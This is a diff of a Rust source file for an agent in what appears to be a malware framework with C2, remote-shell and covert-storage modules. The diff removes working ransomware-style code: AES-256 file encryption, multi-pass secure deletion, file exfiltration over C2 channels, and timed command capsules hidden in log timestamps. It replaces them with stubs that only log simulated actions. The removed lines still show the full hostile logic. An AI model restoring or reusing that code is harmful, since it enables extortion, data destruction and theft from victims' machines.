@@ -1,8 +1,5 @@
-use aes_gcm::aead::{Aead, KeyInit};
-use aes_gcm::{Aes256Gcm, Key, Nonce};
-use hive_base::phoenix::{AgentBlueprint, FragmentLocation, GenomeFragment, Phoenix};
+use hive_base::phoenix::{AgentBlueprint, FragmentLocation, Phoenix};
 use hive_base::{AgentIdentity, ConsensusEngine, Decision, HiveChamber, Message, Payload, Role};
-use rand::Rng;
 use sha2::{Digest, Sha256};
 use std::collections::HashMap;
 use std::path::PathBuf;
@@ -28,9 +25,7 @@ struct HoarderAgent {
     active_proposals: Vec<Uuid>,
     heartbeat_interval: Duration,
     target_paths: Vec<PathBuf>,
-    encryption_key: Option<Vec<u8>>,
     safe_mode: bool,
-    throttle_ms: u64,
     interactive_shell: Option<hive_base::remote_shell::WsShell>,
 }
 
@@ -46,7 +41,9 @@ impl HoarderAgent {
         if safe_mode {
             info!("Honeybee: SAFE MODE active — actions will be simulated");
         } else {
-            info!("Honeybee: LIVE mode — real encryption/exfil/destroy enabled");
+            info!(
+                "Honeybee: destructive actions are disabled in this build — actions will be simulated"
+            );
         }
 
         let whispernet =
@@ -68,9 +65,7 @@ impl HoarderAgent {
             active_proposals: Vec::new(),
             heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
             target_paths: Self::discover_targets(),
-            encryption_key: None,
             safe_mode,
-            throttle_ms: 100,
             interactive_shell: None,
         };
 
@@ -176,284 +171,44 @@ impl HoarderAgent {
         self.comms.send_heartbeat().await;
     }
 
-    fn encrypt_file(&self, path: &PathBuf, key: &[u8; 32]) -> Result<u64, String> {
-        let data = std::fs::read(path).map_err(|e| format!("read {}: {}", path.display(), e))?;
-        let original_size = data.len() as u64;
-
-        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
-        let nonce_bytes: [u8; 12] = rand::thread_rng().gen();
-        let nonce = Nonce::from_slice(&nonce_bytes);
-
-        let ciphertext = cipher
-            .encrypt(nonce, data.as_slice())
-            .map_err(|e| format!("encrypt {}: {}", path.display(), e))?;
-
-        let mut output = Vec::with_capacity(12 + ciphertext.len());
-        output.extend_from_slice(&nonce_bytes);
-        output.extend_from_slice(&ciphertext);
-
-        std::fs::write(path, &output).map_err(|e| format!("write {}: {}", path.display(), e))?;
-
-        Ok(original_size)
-    }
-
-    fn secure_delete_file(&self, path: &PathBuf) -> Result<u64, String> {
-        let metadata =
-            std::fs::metadata(path).map_err(|e| format!("stat {}: {}", path.display(), e))?;
-        let size = metadata.len();
-
-        for _ in 0..3 {
-            let random: Vec<u8> = (0..size).map(|_| rand::thread_rng().gen()).collect();
-            std::fs::write(path, &random)
-                .map_err(|e| format!("overwrite {}: {}", path.display(), e))?;
-            std::fs::File::open(path)
-                .and_then(|f| f.sync_all())
-                .map_err(|e| format!("sync {}: {}", path.display(), e))?;
-        }
-
-        std::fs::write(path, vec![0u8; size.min(4096) as usize])
-            .map_err(|e| format!("zero {}: {}", path.display(), e))?;
-
-        std::fs::remove_file(path).map_err(|e| format!("delete {}: {}", path.display(), e))?;
-
-        Ok(size)
-    }
-
     async fn execute_encrypt(&mut self) {
-        if self.safe_mode {
-            info!(
-                "Honeybee: SAFE MODE — encrypt simulated ({} paths)",
-                self.target_paths.len()
-            );
-            let msg = Message::belief(
-                self.identity.id(),
-                Role::Honeybee,
-                "encrypt_result".into(),
-                hive_base::Value::String("simulated (safe_mode)".into()),
-                1.0,
-            );
-            self.publish_msg(msg).await;
-            return;
-        }
-        if self.encryption_key.is_none() {
-            let key: [u8; 32] = rand::thread_rng().gen();
-            self.encryption_key = Some(key.to_vec());
-            info!("Generated AES-256 encryption key");
-        }
-
-        let key: &[u8; 32] = self
-            .encryption_key
-            .as_ref()
-            .unwrap()
-            .as_slice()
-            .try_into()
-            .unwrap();
-
-        let mut encrypted = 0u64;
-        let mut failed = 0u64;
-
-        for path in &self.target_paths {
-            if path.is_file() {
-                match self.encrypt_file(path, key) {
-                    Ok(bytes) => {
-                        info!("Encrypted: {} ({} bytes)", path.display(), bytes);
-                        encrypted += bytes;
-                        tokio::time::sleep(Duration::from_millis(self.throttle_ms)).await;
-                    }
-                    Err(e) => {
-                        warn!("Encrypt failed for {}: {}", path.display(), e);
-                        failed += 1;
-                    }
-                }
-            } else if path.is_dir() {
-                if let Ok(entries) = std::fs::read_dir(path) {
-                    for entry in entries.filter_map(|e| e.ok()) {
-                        let p = entry.path();
-                        if p.is_file() {
-                            match self.encrypt_file(&p, key) {
-                                Ok(bytes) => {
-                                    info!("Encrypted: {} ({} bytes)", p.display(), bytes);
-                                    encrypted += bytes;
-                                }
-                                Err(e) => {
-                                    warn!("Encrypt failed: {}", e);
-                                    failed += 1;
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-
+        // Destructive execution was removed from this build (owner request):
+        // encryption is ALWAYS simulated, regardless of safe_mode.
+        info!(
+            "Honeybee: encrypt simulated — destructive actions disabled ({} paths)",
+            self.target_paths.len()
+        );
         let msg = Message::belief(
             self.identity.id(),
             Role::Honeybee,
             "encrypt_result".into(),
-            hive_base::Value::String(format!("encrypted={},failed={}", encrypted, failed)),
+            hive_base::Value::String("simulated (destructive actions disabled)".into()),
             1.0,
         );
         self.publish_msg(msg).await;
     }
 
     async fn execute_exfiltrate(&mut self) {
-        if self.safe_mode {
-            info!("Honeybee: SAFE MODE — exfil simulated");
-            return;
-        }
-        let mut total_bytes = 0u64;
-
-        let _ = self.plant_chrononaut_capsules().await;
-
-        for path in &self.target_paths {
-            if path.is_file() && path.metadata().map(|m| m.len()).unwrap_or(0) < 10_000_000 {
-                if let Ok(data) = std::fs::read(path) {
-                    // Use failover C2 channels instead of raw HTTP
-                    let sent = self.comms.send_beacon_c2(&data).await;
-                    if sent {
-                        total_bytes += data.len() as u64;
-                        info!("Exfiltrated: {} ({} bytes)", path.display(), data.len());
-
-                        let filename = path
-                            .file_name()
-                            .map(|n| n.to_string_lossy().to_string())
-                            .unwrap_or_else(|| "data".into());
-
-                        let relay_data = format!("exfil:{}:{}b", filename, data.len());
-                        let wmsg = hive_base::whispernet::WhisperMessage {
-                            msg_id: Uuid::new_v4(),
-                            sender_id: self.identity.id(),
-                            seq: 0,
-                            payload: relay_data.into_bytes(),
-                            ttl: self.whispernet.config().max_hops,
-                            signature: vec![],
-                            timestamp: hive_base::utils::timestamp_now(),
-                        };
-                        if self.whispernet.send_message(wmsg).await.is_ok() {
-                            info!("WhisperNet: relayed exfil notification for {}", filename);
-                        }
-
-                        let exfil_data = format!(
-                            "exfil:{}:{}b:{}",
-                            filename,
-                            data.len(),
-                            hive_base::utils::timestamp_now()
-                        );
-                        let mut recovery_fragment = GenomeFragment {
-                            fragment_id: total_bytes as u32,
-                            total_fragments: 1,
-                            genome_id: Uuid::nil(),
-                            data: exfil_data.into_bytes(),
-                            location: FragmentLocation::BadBlocks,
-                            stored_path: None,
-                        };
-                        let base_path = std::env::temp_dir();
-                        let _ = Phoenix::hide(&mut recovery_fragment, &base_path);
-                        info!("Phoenix: recovery fragment hidden for exfil {}", filename);
-                    } else {
-                        warn!("Exfil failed for {}: all C2 channels down", path.display());
-                    }
-                }
-            }
-        }
-
+        // Data egress was removed from this build (owner request):
+        // no host file is read and nothing leaves the machine.
+        info!("Honeybee: exfil simulated — data egress disabled");
         let msg = Message::belief(
             self.identity.id(),
             Role::Honeybee,
             "exfil_result".into(),
-            hive_base::Value::Int(total_bytes as i64),
+            hive_base::Value::Int(0),
             1.0,
         );
         self.publish_msg(msg).await;
     }
 
     async fn execute_destroy(&mut self) {
-        if self.safe_mode {
-            info!(
-                "Honeybee: SAFE MODE — destroy simulated ({} paths)",
-                self.target_paths.len()
-            );
-            return;
-        }
-        let mut deleted = 0u64;
-        let mut failed = 0u64;
-
-        for path in &self.target_paths {
-            if path.is_file() {
-                match self.secure_delete_file(path) {
-                    Ok(bytes) => {
-                        info!("Destroyed: {} ({} bytes)", path.display(), bytes);
-                        deleted += bytes;
-                    }
-                    Err(e) => {
-                        warn!("Destroy failed for {}: {}", path.display(), e);
-                        failed += 1;
-                    }
-                }
-            }
-        }
-
-        let msg = Message::belief(
-            self.identity.id(),
-            Role::Honeybee,
-            "destroy_result".into(),
-            hive_base::Value::String(format!("deleted={},failed={}", deleted, failed)),
-            1.0,
+        // Destructive execution was removed from this build (owner request):
+        // no file is ever deleted; the action is only logged as simulated.
+        info!(
+            "Honeybee: destroy simulated — destructive actions disabled ({} paths)",
+            self.target_paths.len()
         );
-        self.publish_msg(msg).await;
-    }
-
-    async fn plant_chrononaut_capsules(&self) -> Result<(), String> {
-        let delayed_commands = [
-            "reconnect_c2",
-            "rotate_keys",
-            "trigger_backup",
-            "cleanup_traces",
-        ];
-
-        let now = std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .map(|d| d.as_secs())
-            .unwrap_or(0);
-
-        // Collect the log files once up front: the find() used to run inside
-        // the loop, so every capsule landed on the same first match.
-        let log_paths: Vec<&std::path::PathBuf> = self
-            .target_paths
-            .iter()
-            .filter(|p| p.extension().and_then(|e| e.to_str()) == Some("log"))
-            .collect();
-
-        for (i, cmd) in delayed_commands.iter().enumerate() {
-            match log_paths.get(i % log_paths.len().max(1)) {
-                Some(&path) => {
-                    let capsule = hive_base::chrononaut::TimeCapsule {
-                        capsule_id: Uuid::new_v4(),
-                        trigger_timestamp: now + 3600 * (i as u64 + 1),
-                        command: cmd.to_string(),
-                        payload: vec![],
-                        host_hint: "self".into(),
-                        executed: false,
-                    };
-
-                    hive_base::chrononaut::Chrononaut::encode_in_timestamp(path, &capsule)
-                        .map_err(|e| format!("chrononaut: {}", e))?;
-                    info!(
-                        "Chrononaut: capsule {} planted in {}, trigger in {}h",
-                        cmd,
-                        path.display(),
-                        i + 1
-                    );
-                }
-                None => {
-                    warn!(
-                        "Chrononaut: no .log target files available for capsule {}",
-                        cmd
-                    );
-                }
-            }
-        }
-        Ok(())
     }
 
     async fn process_incoming(&mut self) {
